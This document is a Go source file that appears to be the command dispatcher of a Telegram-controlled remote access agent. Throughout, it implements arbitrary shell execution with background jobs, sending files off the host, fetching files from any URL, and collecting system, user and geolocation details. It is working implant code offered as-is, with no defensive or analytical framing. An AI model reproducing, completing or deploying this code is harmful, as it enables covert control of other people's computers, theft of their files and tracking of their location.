package main

import (
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
)

var (
	bgJobs   = map[int]*exec.Cmd{}
	bgJobsMu sync.Mutex
	bgJobID  int
)

// ─────────────────────────────────────────────────────────────────────────────
// Command Dispatcher
// ─────────────────────────────────────────────────────────────────────────────

func executeCommand(command string) string {
	command = strings.TrimSpace(command)

	switch {

	case command == "/start":
		return "Agent active."

	case strings.HasPrefix(command, "/"):
		return ""

	case command == "help":
		return `HELP MENU

Agent Commands
--------------
help                  Show help menu
info                  System information
location              Public IP + geolocation
jobs                  List running background jobs
kill <id>             Kill background job
cd <dir>              Change working directory
cd ..                 Go up one directory
download <file>       Send file to Telegram
get <url>             Download file from URL

Shell
-----
shell <cmd>           Execute shell command
shell <cmd> &         Execute shell command in background`

	case command == "info":
		return sysInfo()

	case command == "location":
		return getLocation()

	case command == "jobs":
		return listJobs()

	case command == "cd ..":
		return changeDir("..")

	case strings.HasPrefix(command, "cd "):
		dir := strings.TrimSpace(strings.TrimPrefix(command, "cd "))
		return changeDir(dir)

	case strings.HasPrefix(command, "kill "):
		return killJob(strings.TrimSpace(strings.TrimPrefix(command, "kill ")))

	case strings.HasPrefix(command, "download "):
		filename := strings.TrimSpace(strings.TrimPrefix(command, "download "))
		if err := sendFile(filename); err != nil {
			return "Error sending file: " + err.Error()
		}
		return "File sent: " + filename

	case strings.HasPrefix(command, "get "):
		rawURL := strings.TrimSpace(strings.TrimPrefix(command, "get "))
		return downloadFromURL(rawURL)

	case strings.HasPrefix(command, "shell "):

		cmd := strings.TrimSpace(
			strings.TrimPrefix(command, "shell "),
		)

		if strings.HasSuffix(cmd, "&") {
			cmd = strings.TrimSpace(strings.TrimSuffix(cmd, "&"))
			return executeShellBackground(cmd)
		}

		return executeShell(cmd)

	default:
		return "Unknown command. Type 'help' for available commands."
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Shell Execution
// ─────────────────────────────────────────────────────────────────────────────

func executeShell(command string) string {

	cmd := buildCmd(command)

	out, err := cmd.CombinedOutput()

	if err != nil && len(out) == 0 {
		return "Error: " + err.Error()
	}

	return strings.TrimSpace(string(out))
}

func executeShellBackground(command string) string {

	cmd := buildCmd(command)

	if err := cmd.Start(); err != nil {
		return "Error starting background job: " + err.Error()
	}

	bgJobsMu.Lock()

	bgJobID++

	id := bgJobID

	bgJobs[id] = cmd

	bgJobsMu.Unlock()

	go func() {

		_ = cmd.Wait()

		bgJobsMu.Lock()
		delete(bgJobs, id)
		bgJobsMu.Unlock()

	}()

	return fmt.Sprintf(
		"[*] Background job started\nID: %d\nPID: %d",
		id,
		cmd.Process.Pid,
	)
}

func buildCmd(command string) *exec.Cmd {

	if runtime.GOOS == "windows" {
		return exec.Command("cmd", "/C", command)
	}

	return exec.Command("sh", "-c", command)
}

// ─────────────────────────────────────────────────────────────────────────────
// Background Jobs
// ─────────────────────────────────────────────────────────────────────────────

func listJobs() string {

	bgJobsMu.Lock()
	defer bgJobsMu.Unlock()

	if len(bgJobs) == 0 {
		return "No background jobs running."
	}

	var sb strings.Builder

	sb.WriteString("Background jobs running\n\n")

	for id, cmd := range bgJobs {
		sb.WriteString(
			fmt.Sprintf(
				"ID: %d | PID: %d\n",
				id,
				cmd.Process.Pid,
			),
		)
	}

	return strings.TrimSpace(sb.String())
}

func killJob(idStr string) string {

	var id int

	if _, err := fmt.Sscanf(idStr, "%d", &id); err != nil {
		return "Invalid job ID"
	}

	bgJobsMu.Lock()

	cmd, ok := bgJobs[id]

	bgJobsMu.Unlock()

	if !ok {
		return fmt.Sprintf("Job ID %d not found", id)
	}

	if err := cmd.Process.Kill(); err != nil {
		return "Error killing job: " + err.Error()
	}

	return fmt.Sprintf("[*] Job ID %d terminated", id)
}

// ─────────────────────────────────────────────────────────────────────────────
// System
// ─────────────────────────────────────────────────────────────────────────────

func sysInfo() string {

	hostname, _ := os.Hostname()
	wd, _ := os.Getwd()

	return fmt.Sprintf(
		"OS: %s\nArch: %s\nHostname: %s\nCPUs: %d\nCWD: %s\nUser: %s",
		runtime.GOOS,
		runtime.GOARCH,
		hostname,
		runtime.NumCPU(),
		wd,
		currentUser(),
	)
}

func currentUser() string {

	if u := os.Getenv("USER"); u != "" {
		return u
	}

	if u := os.Getenv("USERNAME"); u != "" {
		return u
	}

	return "unknown"
}

// ─────────────────────────────────────────────────────────────────────────────
// Filesystem
// ─────────────────────────────────────────────────────────────────────────────

func changeDir(dir string) string {

	if err := os.Chdir(dir); err != nil {
		return "Error: " + err.Error()
	}

	wd, _ := os.Getwd()

	return "CWD: " + wd
}

// ─────────────────────────────────────────────────────────────────────────────
// Network
// ─────────────────────────────────────────────────────────────────────────────

func getLocation() string {

	resp, err := HTTPClient.Get("https://ifconfig.me/ip")

	if err != nil {
		return "Error getting public IP: " + err.Error()
	}

	defer resp.Body.Close()

	b, _ := io.ReadAll(resp.Body)

	publicIP := strings.TrimSpace(string(b))

	resp2, err := HTTPClient.Get("http://ip-api.com/json/" + publicIP)

	if err != nil {
		return "IP: " + publicIP +
			"\nError getting geo info: " + err.Error()
	}

	defer resp2.Body.Close()

	var geo map[string]interface{}

	if err := json.NewDecoder(resp2.Body).Decode(&geo); err != nil {
		return "IP: " + publicIP
	}

	return fmt.Sprintf(
		"IP: %s\nCountry: %v\nRegion: %v\nCity: %v\nLat: %v\nLon: %v\nTimezone: %v\nISP: %v",
		publicIP,
		geo["country"],
		geo["region"],
		geo["city"],
		geo["lat"],
		geo["lon"],
		geo["timezone"],
		geo["isp"],
	)
}

func downloadFromURL(rawURL string) string {

	resp, err := HTTPClient.Get(rawURL)

	if err != nil {
		return "Error: " + err.Error()
	}

	defer resp.Body.Close()

	parts := strings.Split(rawURL, "/")

	filename := parts[len(parts)-1]

	if filename == "" {
		filename = "downloaded_file"
	}

	f, err := os.Create(filename)

	if err != nil {
		return "Error creating file: " + err.Error()
	}

	defer f.Close()

	if _, err := io.Copy(f, resp.Body); err != nil {
		return "Error saving file: " + err.Error()
	}

	return "Downloaded: " + filename
}
